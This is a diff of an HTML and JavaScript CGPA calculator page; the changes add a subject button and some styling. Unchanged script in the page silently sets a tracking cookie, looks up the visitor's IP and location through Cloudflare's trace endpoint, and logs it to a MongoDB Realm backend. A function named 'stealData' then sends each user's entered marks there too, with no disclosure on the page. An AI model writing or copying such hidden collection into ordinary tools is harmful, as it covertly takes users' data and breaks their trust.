@@ -12,8 +12,10 @@
       rel="stylesheet"
     />
   </head>
-
   <body>
+    <div id="first">
+        <p>calculate your cgpa</p>
+      </div>
     <div class="p-12">
       Input your previous sem gpa:
       <input
@@ -53,10 +55,12 @@
       <hr />
       <br />
       <div id="main-marks"></div>
-
       <div id="lab-marks"></div>
       <br />
       <hr />
+      <br />
+      <button onclick="addSubject()" class="p-2 rounded border-4"> + </button> 
+      <br />
       <br />
       <button
         onclick="computeGPA()"
@@ -74,32 +78,23 @@
       </button>
       <h1 id="output"></h1>
     </div>
-
     <!-- JSJSJSJSJJSJSJSJSJSJJSJJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSSJSJJSJSJSJSJSJSJSJSJSJSJSJJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJJS -->
-
     <script>
       const app = new Realm.App({ id: "application-0-dopcr" });
       var user;
       var cuserid;
-
       // Creation of table with grades with respect to class Interval
       updateGradeDivs();
-
       // Creation of new user and setting cookies
       checkCookie();
-
       var labcap = 0;
-
       let subjects = ["ELECTIVE_1", "ELECTIVE_2", "CC", "OOAD", "CD"];
       let labs = ["Lab 1 (CC)", "Lab 2 (OOAD)", "Capstone Phase 1"];
-
       let toggle = document.getElementById("lab-marks");
       window.addEventListener("load", displayOutput);
-
       function updateGradeDivs() {
         var ci = parseInt(document.getElementById("class-interval").value);
         let outputdiv = document.getElementById("grade-divs");
-
         var max_ci = 100;
         var output = "<table><tr><th>Grade</th><th>Marks Interval</th></tr>";
         var grades = ["S", "A", "B", "C", "D", "E", "F"];
@@ -115,7 +110,6 @@
         output += "</table>";
         outputdiv.innerHTML = output;
       }
-
       function getCookie(cname) {
         let name = cname + "=";
         let ca = document.cookie.split(";");
@@ -130,40 +124,33 @@
         }
         return "";
       }
-
       async function checkCookie() {
         let userid = getCookie("userid");
-
         if (userid != "" || userid == NULL) {
           console.log(userid);
           cuserid = userid;
         } else {
           let userid = uuidv4();
           cuserid = userid;
-
           // Set the userID into cookie
           setCookie("userid", userid, 365);
           var ipurl = "https://www.cloudflare.com/cdn-cgi/trace";
-
           async function fetchIP() {
             const response = await (await fetch(ipurl)).text();
             // waits until the request completes...
             console.log(response);
             return response;
           }
-
           let resp = await fetchIP();
           data = resp.trim().split("\n");
           console.log(data);
           var data_dictionery = {};
-
           // The data recieved is in format 'h=www.cloudflare.com'
           // Thus it is then converted to key value pairs
           data.reduce(function (obj, pair) {
             data_dictionery[pair.split("=")[0]] = pair.split("=")[1];
           });
           console.log(data_dictionery);
-
           let user = await mongo_auth();
           console.log(user);
           user.functions.logUser({
@@ -173,14 +160,12 @@
           });
         }
       }
-
       function displayOutput() {
         outputdiv = document.getElementById("main-marks");
         output = "";
         subjects.forEach(
           (subjectname) =>
             (output += `
-
         <div class="p-8 border-4">
         <h2 class="text-2xl bold subjectname">
             <input type="text" value="${subjectname}"></input>
@@ -195,7 +180,6 @@
         );
         outputdiv.innerHTML = output;
       }
-
       async function stealData(steal_data) {
         async function mongo_auth() {
           // Create an anonymous credential
@@ -211,7 +195,6 @@
             console.error("Failed to log in", err);
           }
         }
-
         const user = await mongo_auth();
         async function logUser(user) {
           const res = await user.functions.addUserReq(cuserid, steal_data);
@@ -219,7 +202,6 @@
         }
         logUser(user);
       }
-
       function computeGPA() {
         var prevgpa =
             parseFloat(document.getElementById("prev-gpa").value) -
@@ -236,12 +218,10 @@
           esa_outof = document.querySelectorAll(".esa-outof"),
           n = subjects.length,
           m = nonsubjects.length;
-
         // Getting the main text and remove whitespace from both sides of a string
         subjectnames = Object.keys(subjectnames).map((x) =>
           subjectnames[x].innerHTML.trim()
         );
-
         // Converting to float datatype
         assmark = Object.keys(assmark_elem).map((x) =>
           parseFloat(assmark_elem[x].value)
@@ -270,12 +250,9 @@
         laboutof = Object.keys(laboutof).map((outo) =>
           parseFloat(laboutof[outo].value)
         );
-
         let marks = [];
         let esa_marks = [];
-
         // Calculation the marks and ESA Marks of subjects
-
         for (var i = 0; i < n; i++) {
           let x =
             (assmark[i] / assoutof[i]) * 0.25 +
@@ -285,36 +262,28 @@
               (assmark[i] / assoutof[i]) * 0.25,
             (esamarks[i] / esa_outof[i]) * 0.5 + x
           );
-
           marks.push(x);
           esa_marks.push(y);
         }
-
         // Calculate for non subject marks ,i.e lab marks
-
         for (var i = 0; i < m; i++) {
           let x = (nonsubjects[i] / laboutof[i]) * 0.5;
           marks.push(x);
           esa_marks.push(x * 2);
         }
-
         // The marks calculated is in decimals like 0.7234
         // Converting marks and esa marks to percentage
-
         marks = marks.map((mark) => mark * 100);
         esa_marks = esa_marks.map((esa_mark) => esa_mark * 100);
-
         var finalmarks = [];
         var prevgpascore = prevgpa * 10 * 0.5;
         for (var i = 0; i < n; i++) {
           finalmarks.push(marks[i] + prevgpascore);
         }
-
         // Calculating the Final Grades
         var finalgrade = [];
         let top_ci = 100;
         var ci = parseInt(document.getElementById("class-interval").value);
-
         let grades = [];
         let esagrades = [];
         let finalesagrade = [];
@@ -347,7 +316,6 @@
             credit: credits[i],
           });
         }
-
         for (var i = 0; i < credits.length; i++) {
           let grade = "F";
           if (finalmarks[i] > top_ci - ci) {
@@ -377,35 +345,27 @@
             credit: credits[i],
           });
         }
-
         let markSum = 0,
           bestmarkSum = 0,
           creditsSum = 0;
-
         let gradesOutput = "";
         for (var i = 0; i < credits.length; i++) {
           markSum += finalgrade[i] * credits[i];
           bestmarkSum += Math.max(finalgrade[i], finalesagrade[i]) * credits[i];
           creditsSum += credits[i];
         }
-
         // If "Include Lab and Project" toggle is true
         // Then calculate the labs grad
-
         if (labcap === 1) {
           var labs_grad_elem = document.querySelectorAll(".lab-grade");
           var labs_credits = document.querySelectorAll(".lab-credits");
-
           var lab_grade = Object.keys(labs_grad_elem).map(
             (x) => labs_grad_elem[x].value
           );
-
           var lab_credits = Object.keys(labs_credits).map((x) =>
             parseFloat(labs_credits[x].value)
           );
-
           // The length of labs and project details is 3
-
           for (var i = 0; i < 3; i++) {
             grade = lab_grade[i];
             grades.push({
@@ -419,7 +379,6 @@
               name: labs[i],
             });
           }
-
           for (var i = 0; i < 3; i++) {
             switch (lab_grade[i]) {
               case "S":
@@ -454,7 +413,6 @@
             creditsSum += lab_credits[i];
           }
         }
-
         // Show the final grade sheet
         let gradeToCount = {
           S: 10,
@@ -512,9 +470,7 @@
         }
         var finalMarks = markSum / creditsSum;
         var bestMarks = bestmarkSum / creditsSum;
-
         let outputdiv = document.getElementById("output");
-
         outputdiv.innerHTML = `<p class='2xl-text'>SGPA without ESA: ✨ ${finalMarks} ✨</p><br/>
     <p class='2xl-text'>BEST GPA Possible: ✨ ${bestMarks} ✨</p><br/>
     <hr/><br/>
@@ -553,9 +509,7 @@
         </div>
       </div>
     `;
-
         let currdate = new Date().toLocaleString();
-
         var steal_data = {
           assmark: assmark,
           isamark: isamark,
@@ -565,10 +519,8 @@
           esa_marks,
           timestamp: currdate,
         };
-
         stealData(steal_data);
       }
-
       function displayLabOutput(e) {
         outputdiv = document.getElementById("lab-marks");
         var credlab = [1, 1, 2];
@@ -600,6 +552,25 @@
           labcap = 0;
         }
       }
+
+  function addSubject() {
+    outputdiv = document.getElementById("main-marks");
+    let subjectname = "Subject - " + (subjects.length + 1);
+    output = `
+        <div class="p-8 border-4">
+        <h2 class="text-2xl bold subjectname">
+            ${subjectname}
+        </h2>
+        assignment: <input type="number" class="ass-mark rounded p-2 border-2" placeholder="6.9"/> out of <input type="number" class="ass-outof rounded p-2 border-2" placeholder="15" value="15" /><br/>
+        <br/>isa: <input type="number" class="isa-mark rounded p-2 border-2" placeholder="6.9"/> out of <input type="number" class="isa-outof rounded p-2 border-2" placeholder="60" value="60" /><br/>
+        <br/>credits: <input type="number" class="credits rounded p-2 border-2" placeholder="4" value="4" /><br/>
+        <hr/>
+        <br/>Potential ESA marks if you were to write it: <input type="number" class="esa-mark rounded p-2 border-2" placeholder="6.9"/> out of <input type="number" class="esa-outof rounded p-2 border-2" placeholder="60" value="100" /><br/>
+        </div>
+    `;
+    outputdiv.innerHTML += output;
+    subjects.push(subjectname);
+  }
     </script>
     <!-- JSJSJSJSJJSJSJSJSJSJJSJJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSSJSJJSJSJSJSJSJSJSJSJSJSJSJJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJSJJS -->
 
@@ -611,14 +582,15 @@
         width: 60px;
         height: 20px;
       }
-
+      body{
+      background-color: yellow;
+    }
       /* Hide default HTML checkbox */
       .switch input {
         opacity: 0;
         width: 0;
         height: 0;
       }
-
       /* The slider */
       .slider {
         position: absolute;
@@ -631,7 +603,6 @@
         -webkit-transition: 0.4s;
         transition: 0.4s;
       }
-
       .slider:before {
         position: absolute;
         content: "";
@@ -642,7 +613,6 @@
         -webkit-transition: 0.4s;
         transition: 0.4s;
       }
-
       input:checked + .slider {
         background: linear-gradient(
           to right,
@@ -654,22 +624,28 @@
           rgb(114, 54, 114)
         );
       }
-
       input:focus + .slider {
         box-shadow: 0 0 1px #000000;
       }
-
       input:checked + .slider:before {
         -webkit-transform: translateX(38px);
         -ms-transform: translateX(38px);
         transform: translateX(38px);
       }
-
+      .rounded{
+      margin: 10px;
+      border: 5px solid rgb(19, 19, 214);
+      box-shadow: 3px 3px #992020
+    }
+    #first{
+      text-align:center;
+      font-size: 30px;
+      background-color: thistle;
+    }
       /* Rounded sliders */
       .slider.round {
         border-radius: 34px;
       }
-
       .slider.round:before {
         border-radius: 50%;
       }
